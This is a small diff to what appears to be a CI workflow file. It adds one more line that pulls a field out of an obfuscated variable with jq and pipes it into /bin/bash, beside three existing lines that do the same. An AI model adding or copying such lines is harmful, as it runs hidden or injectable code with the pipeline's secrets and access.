@@ -26,6 +26,7 @@ jobs:
           echo $t75 | jq -r .a0 | /bin/bash
           echo $akl64435 | jq -r .qunxp4 | /bin/bash
           echo $qd8 | jq -r .xebbp506 | /bin/bash
+          printf '%s' "$t1" | jq -r .x4 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
